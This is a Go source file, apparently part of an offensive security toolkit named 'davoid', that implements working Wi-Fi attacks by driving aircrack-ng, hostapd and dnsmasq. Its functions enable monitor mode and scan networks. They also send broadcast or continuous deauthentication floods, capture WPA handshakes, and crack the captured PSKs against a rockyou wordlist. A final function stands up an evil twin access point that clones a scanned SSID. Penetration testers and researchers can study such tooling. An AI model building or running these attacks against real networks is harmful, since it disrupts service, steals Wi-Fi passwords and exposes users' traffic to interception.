package wifi

import (
	"bufio"
	"encoding/csv"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
	"github.com/bryanparreira/davoid/internal/vault"
)

// Shared state between modules (populated by RunScan, consumed by Deauth/Handshake/EvilTwin).
var (
	lastScanNetworks []wifiNetwork
	lastCapturePath  string
)

type wifiNetwork struct {
	BSSID      string
	ESSID      string
	Channel    string
	Signal     string
	Encryption string
	Clients    []string
}

// =============================================================================
// 1. Monitor Mode
// =============================================================================

func RunMonitor() error {
	ui.Header("Monitor Mode — Wireless Interface Manager")

	if _, err := exec.LookPath("airmon-ng"); err != nil {
		ui.Fail("airmon-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found. Ensure a wireless adapter is connected.")
		return nil
	}

	action := ui.Select("Action", []string{
		"Start monitor mode",
		"Stop monitor mode",
		"Check interfaces (iwconfig)",
	})
	if action < 0 {
		return nil
	}

	if action == 2 {
		out, _ := exec.Command("iwconfig").CombinedOutput()
		fmt.Println(string(out))
		ui.PressEnter()
		return nil
	}

	idx := ui.Select("Interface", ifaces)
	if idx < 0 {
		return nil
	}
	iface := ifaces[idx]

	var cmd *exec.Cmd
	if action == 0 {
		ui.Info(fmt.Sprintf("Starting monitor mode on %s...", iface))
		cmd = exec.Command("airmon-ng", "start", iface)
	} else {
		ui.Info(fmt.Sprintf("Stopping monitor mode on %s...", iface))
		cmd = exec.Command("airmon-ng", "stop", iface)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		ui.Fail(fmt.Sprintf("airmon-ng error: %v", err))
		fmt.Println(string(out))
		ui.PressEnter()
		return nil
	}

	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(strings.ToLower(line), "monitor mode") {
			ui.Success(line)
		}
	}

	if action == 0 {
		ui.Success(fmt.Sprintf("Monitor mode started. New interface is typically %smon or mon0.", iface))
		ui.Info("Run 'iw dev' to confirm the monitor interface name.")
	} else {
		ui.Success(fmt.Sprintf("Monitor mode stopped on %s.", iface))
	}

	ui.PressEnter()
	return nil
}

// =============================================================================
// 2. WiFi Network Scan (airodump-ng)
// =============================================================================

func RunScan() error {
	ui.Header("WiFi Scanner — airodump-ng Network Discovery")

	if _, err := exec.LookPath("airodump-ng"); err != nil {
		ui.Fail("airodump-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return nil
	}

	idx := ui.Select("Monitor interface", ifaces)
	if idx < 0 {
		return nil
	}
	monIface := ifaces[idx]

	durStr := ui.PromptDefault("Scan duration (seconds)", "15")
	dur, _ := strconv.Atoi(durStr)
	if dur <= 0 {
		dur = 15
	}

	tmpBase := fmt.Sprintf("/tmp/davoid_scan_%d", time.Now().Unix())
	csvFile := tmpBase + "-01.csv"
	defer os.Remove(csvFile)
	defer os.Remove(tmpBase + "-01.kismet.csv")
	defer os.Remove(tmpBase + "-01.kismet.netxml")

	ui.Info(fmt.Sprintf("Scanning for %d seconds on %s...", dur, monIface))
	fmt.Println()

	cmd := exec.Command("airodump-ng",
		"--output-format", "csv",
		"--write", tmpBase,
		"--write-interval", "2",
		monIface,
	)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		ui.Fail(fmt.Sprintf("airodump-ng failed to start: %v", err))
		return nil
	}

	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	deadline := time.Now().Add(time.Duration(dur) * time.Second)
	ticker := time.NewTicker(100 * time.Millisecond)
	i := 0
	for time.Now().Before(deadline) {
		<-ticker.C
		fmt.Printf("\r  %s  Scanning %s... (%ds remaining)",
			spin[i%len(spin)], monIface, int(time.Until(deadline).Seconds()))
		i++
	}
	ticker.Stop()
	fmt.Print("\r\033[K")
	cmd.Process.Kill()
	cmd.Wait()

	networks, err := parseAirodumpCSV(csvFile)
	if err != nil || len(networks) == 0 {
		ui.Warn("No networks parsed. Ensure the interface is in monitor mode.")
		ui.PressEnter()
		return nil
	}

	lastScanNetworks = networks

	fmt.Println()
	ui.Divider()
	ui.Info(fmt.Sprintf("Found %d network(s):", len(networks)))
	ui.Divider()
	fmt.Printf("  %-18s  %-26s  %-4s  %-5s  %-14s  %s\n",
		"BSSID", "ESSID", "CH", "PWR", "Encryption", "Clients")
	fmt.Println("  " + strings.Repeat("─", 80))

	for _, n := range networks {
		enc := n.Encryption
		if enc == "" {
			enc = "OPN"
		}
		fmt.Printf("  %-18s  %-26s  %-4s  %-5s  %-14s  %d\n",
			n.BSSID,
			wTrunc(n.ESSID, 24),
			n.Channel,
			n.Signal,
			enc,
			len(n.Clients),
		)
	}

	eng, _ := engagement.Active()
	if eng != nil {
		for _, n := range networks {
			engagement.LogFinding(eng.ID, "wifi_scan", n.BSSID,
				fmt.Sprintf("WiFi AP discovered: %s", n.ESSID),
				fmt.Sprintf("BSSID: %s  Channel: %s  Encryption: %s  Signal: %s",
					n.BSSID, n.Channel, n.Encryption, n.Signal),
				"INFO", n.BSSID)
		}
		ui.Success(fmt.Sprintf("%d networks logged to engagement.", len(networks)))
	}

	fmt.Println()
	ui.PressEnter()
	return nil
}

// =============================================================================
// 3. Deauth Attack (aireplay-ng)
// =============================================================================

func RunDeauth() error {
	ui.Header("Deauth Attack — IEEE 802.11 Deauthentication Frames")

	if _, err := exec.LookPath("aireplay-ng"); err != nil {
		ui.Fail("aireplay-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	monIface := pickInterface("Monitor interface")
	if monIface == "" {
		return nil
	}

	bssid, essid, channel := "", "", ""

	if len(lastScanNetworks) > 0 {
		opts := []string{"Enter manually"}
		for _, n := range lastScanNetworks {
			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%s  %s",
				wTrunc(n.ESSID, 22), n.BSSID, n.Channel, n.Encryption))
		}
		idx := ui.Select("Target network", opts)
		if idx > 0 {
			n := lastScanNetworks[idx-1]
			bssid, essid, channel = n.BSSID, n.ESSID, n.Channel
		}
	}

	if bssid == "" {
		bssid = ui.Prompt("Target BSSID (e.g. AA:BB:CC:DD:EE:FF)")
		if bssid == "" {
			return nil
		}
		essid = ui.Prompt("ESSID (optional, for logging)")
		channel = ui.PromptDefault("Channel", "6")
	}

	if channel != "" {
		exec.Command("iwconfig", monIface, "channel", channel).Run()
	}

	clientMAC := ui.PromptDefault("Client MAC (blank = broadcast deauth all clients)", "")
	countStr := ui.PromptDefault("Packet count (0 = continuous)", "0")

	target := bssid
	if essid != "" {
		target = essid + " (" + bssid + ")"
	}

	fmt.Println()
	ui.Info(fmt.Sprintf("Deauthing %s via %s", target, monIface))
	ui.Warn("Press Ctrl+C to stop.")
	ui.Divider()

	args := []string{"--deauth", countStr, "-a", bssid}
	if clientMAC != "" {
		args = append(args, "-c", clientMAC)
	}
	args = append(args, monIface)

	cmd := exec.Command("aireplay-ng", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = nil

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_deauth", target,
			fmt.Sprintf("Deauthentication attack — %s", essid),
			fmt.Sprintf("BSSID: %s  Interface: %s  Client: %s", bssid, monIface, orBroadcast(clientMAC)),
			"HIGH", "")
	}

	cmd.Run()
	fmt.Println()
	ui.PressEnter()
	return nil
}

// =============================================================================
// 4. Handshake Capture (airodump-ng targeted)
// =============================================================================

func RunHandshake() error {
	ui.Header("Handshake Capture — WPA/WPA2 4-Way Handshake")

	if _, err := exec.LookPath("airodump-ng"); err != nil {
		ui.Fail("airodump-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	monIface := pickInterface("Monitor interface")
	if monIface == "" {
		return nil
	}

	bssid, essid, channel := "", "", ""

	if len(lastScanNetworks) > 0 {
		opts := []string{"Enter manually"}
		for _, n := range lastScanNetworks {
			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%s", wTrunc(n.ESSID, 22), n.BSSID, n.Channel))
		}
		idx := ui.Select("Target AP", opts)
		if idx > 0 {
			n := lastScanNetworks[idx-1]
			bssid, essid, channel = n.BSSID, n.ESSID, n.Channel
		}
	}

	if bssid == "" {
		bssid = ui.Prompt("Target BSSID")
		if bssid == "" {
			return nil
		}
		essid = ui.Prompt("ESSID (for file naming)")
		channel = ui.PromptDefault("Channel", "6")
	}

	outBase := fmt.Sprintf("/tmp/davoid_hs_%s_%d", sanitize(essid), time.Now().Unix())
	lastCapturePath = outBase + "-01.cap"

	fmt.Println()
	ui.Info(fmt.Sprintf("Capturing handshake from %s on channel %s...", bssid, channel))
	ui.Info(fmt.Sprintf("Capture: %s", lastCapturePath))
	ui.Warn("Open another terminal and run Deauth against this AP to force a reconnect.")
	ui.Warn("Press Ctrl+C when handshake is captured.")
	ui.Divider()

	cmd := exec.Command("airodump-ng",
		"-c", channel,
		"--bssid", bssid,
		"-w", outBase,
		"--output-format", "pcap",
		monIface,
	)

	errPipe, _ := cmd.StderrPipe()
	if err := cmd.Start(); err != nil {
		ui.Fail(fmt.Sprintf("airodump-ng failed: %v", err))
		return nil
	}

	handshakeCh := make(chan bool, 1)
	go func() {
		scanner := bufio.NewScanner(errPipe)
		for scanner.Scan() {
			if strings.Contains(scanner.Text(), "WPA handshake") {
				handshakeCh <- true
				return
			}
		}
		handshakeCh <- false
	}()

	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	ticker := time.NewTicker(100 * time.Millisecond)
	j := 0
	for {
		select {
		case got := <-handshakeCh:
			ticker.Stop()
			fmt.Print("\r\033[K")
			if got {
				ui.Success(fmt.Sprintf("WPA handshake captured! → %s", lastCapturePath))
			} else {
				ui.Info(fmt.Sprintf("Capture stopped. File saved to %s", lastCapturePath))
			}
			goto done
		case <-ticker.C:
			fmt.Printf("\r  %s  Waiting for WPA handshake from %s...", spin[j%len(spin)], bssid)
			j++
		}
	}
done:
	cmd.Process.Kill()
	cmd.Wait()

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_handshake", bssid,
			fmt.Sprintf("WPA handshake capture attempt — %s", essid),
			fmt.Sprintf("BSSID: %s  File: %s", bssid, lastCapturePath),
			"HIGH", "")
	}

	fmt.Println()
	ui.PressEnter()
	return nil
}

// =============================================================================
// 5. WPA Crack (aircrack-ng)
// =============================================================================

func RunCrack() error {
	ui.Header("WPA Cracker — aircrack-ng Dictionary Attack")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		ui.Fail("aircrack-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	capFile := ""
	if lastCapturePath != "" {
		if _, err := os.Stat(lastCapturePath); err == nil {
			ui.Info(fmt.Sprintf("Last capture: %s", lastCapturePath))
			if !ui.Confirm("Use a different .cap file?") {
				capFile = lastCapturePath
			}
		}
	}
	if capFile == "" {
		capFile = ui.Prompt(".cap file path (e.g. /tmp/davoid_hs-01.cap)")
		if capFile == "" {
			return nil
		}
	}

	wordlist := ui.PromptDefault("Wordlist path", "/usr/share/wordlists/rockyou.txt")
	bssid := ui.PromptDefault("Target BSSID (blank = try all in file)", "")

	fmt.Println()
	ui.Info(fmt.Sprintf("Cracking %s with %s...", capFile, wordlist))
	ui.Warn("Press Ctrl+C to abort.")
	ui.Divider()

	args := []string{"-w", wordlist}
	if bssid != "" {
		args = append(args, "-b", bssid)
	}
	args = append(args, capFile)

	cmd := exec.Command("aircrack-ng", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Println()
	if ui.Confirm("Was a password cracked? Save it to vault?") {
		pass := ui.Prompt("Cracked password")
		essid := ui.PromptDefault("Network name (ESSID)", bssid)
		eng, _ := engagement.Active()
		if eng != nil && pass != "" {
			vault.Save(eng.ID, "wifi_crack", essid, essid, pass, "wifi_psk")
			engagement.LogFinding(eng.ID, "wifi_crack", essid,
				fmt.Sprintf("WPA PSK cracked: %s", essid),
				fmt.Sprintf("BSSID: %s  PSK: %s", bssid, pass),
				"CRITICAL", pass)
			ui.Success("PSK saved to vault and engagement findings.")
		}
	}

	ui.PressEnter()
	return nil
}

// =============================================================================
// 6. Evil Twin AP (hostapd + dnsmasq)
// =============================================================================

func RunEvilTwin() error {
	ui.Header("Evil Twin — Rogue Access Point (hostapd + dnsmasq)")

	missing := []string{}
	for _, tool := range []string{"hostapd", "dnsmasq"} {
		if _, err := exec.LookPath(tool); err != nil {
			missing = append(missing, tool)
		}
	}
	if len(missing) > 0 {
		ui.Fail(fmt.Sprintf("Missing tools: %s", strings.Join(missing, ", ")))
		ui.Info("Install: sudo apt install " + strings.Join(missing, " "))
		return nil
	}

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return nil
	}

	idx := ui.Select("AP interface (use a non-monitor wlan interface)", ifaces)
	if idx < 0 {
		return nil
	}
	apIface := ifaces[idx]

	ssid := ""
	if len(lastScanNetworks) > 0 && ui.Confirm("Clone SSID from last scan?") {
		opts := make([]string, len(lastScanNetworks))
		for i, n := range lastScanNetworks {
			opts[i] = fmt.Sprintf("%-24s  [%s]", wTrunc(n.ESSID, 22), n.BSSID)
		}
		i2 := ui.Select("Select SSID to clone", opts)
		if i2 >= 0 {
			ssid = lastScanNetworks[i2].ESSID
		}
	}
	if ssid == "" {
		ssid = ui.Prompt("SSID for evil twin AP")
		if ssid == "" {
			return nil
		}
	}

	channel := ui.PromptDefault("Channel", "6")
	apIP := ui.PromptDefault("Gateway IP for clients", "192.168.99.1")

	subnet := apIP[:strings.LastIndex(apIP, ".")+1]

	hostapdConf := fmt.Sprintf(`interface=%s
driver=nl80211
ssid=%s
hw_mode=g
channel=%s
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
`, apIface, ssid, channel)

	dnsmasqConf := fmt.Sprintf(`interface=%s
dhcp-range=%s50,%s150,12h
dhcp-option=3,%s
dhcp-option=6,%s
server=8.8.8.8
`, apIface, subnet, subnet, apIP, apIP)

	hostapdPath := "/tmp/davoid_hostapd.conf"
	dnsmasqPath := "/tmp/davoid_dnsmasq.conf"
	defer os.Remove(hostapdPath)
	defer os.Remove(dnsmasqPath)

	if err := os.WriteFile(hostapdPath, []byte(hostapdConf), 0600); err != nil {
		ui.Fail("Could not write hostapd.conf")
		return nil
	}
	if err := os.WriteFile(dnsmasqPath, []byte(dnsmasqConf), 0600); err != nil {
		ui.Fail("Could not write dnsmasq.conf")
		return nil
	}

	// Configure interface IP
	exec.Command("ifconfig", apIface, apIP, "netmask", "255.255.255.0").Run()

	hostapdCmd := exec.Command("hostapd", hostapdPath)
	dnsmasqCmd := exec.Command("dnsmasq", "-C", dnsmasqPath, "--no-daemon")
	hostapdCmd.Stdout = nil
	hostapdCmd.Stderr = nil
	dnsmasqCmd.Stdout = nil
	dnsmasqCmd.Stderr = nil

	if err := hostapdCmd.Start(); err != nil {
		ui.Fail(fmt.Sprintf("hostapd failed: %v", err))
		return nil
	}
	if err := dnsmasqCmd.Start(); err != nil {
		hostapdCmd.Process.Kill()
		ui.Fail(fmt.Sprintf("dnsmasq failed: %v", err))
		return nil
	}

	fmt.Println()
	ui.Success(fmt.Sprintf("Evil twin '%s' live on %s (ch %s)", ssid, apIface, channel))
	ui.Info(fmt.Sprintf("DHCP range: %s50 – %s150", subnet, subnet))
	ui.Warn("Press Ctrl+C to shut down the AP.")

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_eviltwin", ssid,
			fmt.Sprintf("Evil twin AP deployed: %s", ssid),
			fmt.Sprintf("Interface: %s  Channel: %s  Gateway: %s", apIface, channel, apIP),
			"CRITICAL", "")
	}

	hostapdCmd.Wait()
	dnsmasqCmd.Process.Kill()
	dnsmasqCmd.Wait()

	fmt.Println()
	ui.Info("Evil twin stopped.")
	ui.PressEnter()
	return nil
}

// =============================================================================
// Helpers
// =============================================================================

func listAllInterfaces() []string {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("iw", "dev").Output()
		if err == nil {
			var ifaces []string
			for _, line := range strings.Split(string(out), "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "Interface ") {
					ifaces = append(ifaces, strings.TrimPrefix(line, "Interface "))
				}
			}
			if len(ifaces) > 0 {
				return ifaces
			}
		}
		// fallback
		entries, _ := os.ReadDir("/sys/class/net")
		var ifaces []string
		for _, e := range entries {
			name := e.Name()
			if strings.HasPrefix(name, "wlan") || strings.HasPrefix(name, "mon") ||
				strings.HasPrefix(name, "wlp") || strings.HasPrefix(name, "wlx") {
				ifaces = append(ifaces, name)
			}
		}
		return ifaces
	}
	// macOS
	out, _ := exec.Command("networksetup", "-listallhardwareports").Output()
	lines := strings.Split(string(out), "\n")
	var ifaces []string
	for i, line := range lines {
		if strings.Contains(line, "Wi-Fi") || strings.Contains(line, "AirPort") {
			for j := i + 1; j < len(lines) && j < i+3; j++ {
				trimmed := strings.TrimSpace(lines[j])
				if strings.HasPrefix(trimmed, "Device:") {
					ifaces = append(ifaces, strings.TrimSpace(strings.TrimPrefix(trimmed, "Device:")))
				}
			}
		}
	}
	return ifaces
}

func pickInterface(label string) string {
	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return ""
	}
	idx := ui.Select(label, ifaces)
	if idx < 0 {
		return ""
	}
	return ifaces[idx]
}

func parseAirodumpCSV(path string) ([]wifiNetwork, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	raw, err := io.ReadAll(f)
	if err != nil {
		return nil, err
	}

	// Two sections: APs then Stations, separated by blank line
	content := string(raw)
	sections := strings.SplitN(content, "\r\n\r\n", 2)
	if len(sections) < 2 {
		sections = strings.SplitN(content, "\n\n", 2)
	}

	networks := map[string]*wifiNetwork{}

	if len(sections) > 0 {
		r := csv.NewReader(strings.NewReader(sections[0]))
		r.FieldsPerRecord = -1
		r.TrimLeadingSpace = true
		records, _ := r.ReadAll()
		for i, rec := range records {
			if i == 0 || len(rec) < 14 {
				continue
			}
			bssid := strings.TrimSpace(rec[0])
			if bssid == "" || bssid == "BSSID" {
				continue
			}
			essid := strings.TrimSpace(rec[13])
			if essid == "" {
				essid = "<hidden>"
			}
			networks[bssid] = &wifiNetwork{
				BSSID:      bssid,
				Channel:    strings.TrimSpace(rec[3]),
				Signal:     strings.TrimSpace(rec[8]),
				Encryption: strings.TrimSpace(rec[5]),
				ESSID:      essid,
			}
		}
	}

	if len(sections) > 1 {
		r := csv.NewReader(strings.NewReader(sections[1]))
		r.FieldsPerRecord = -1
		r.TrimLeadingSpace = true
		recs, _ := r.ReadAll()
		for i, rec := range recs {
			if i == 0 || len(rec) < 6 {
				continue
			}
			mac := strings.TrimSpace(rec[0])
			ap := strings.TrimSpace(rec[5])
			if n, ok := networks[ap]; ok && mac != "" {
				n.Clients = append(n.Clients, mac)
			}
		}
	}

	result := make([]wifiNetwork, 0, len(networks))
	for _, n := range networks {
		result = append(result, *n)
	}
	return result, nil
}

func orBroadcast(s string) string {
	if s == "" {
		return "broadcast"
	}
	return s
}

func sanitize(s string) string {
	var sb strings.Builder
	for _, r := range strings.ToLower(s) {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			sb.WriteRune(r)
		} else {
			sb.WriteRune('_')
		}
	}
	result := sb.String()
	if result == "" {
		return "network"
	}
	return result
}

func wTrunc(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-1] + "…"
}
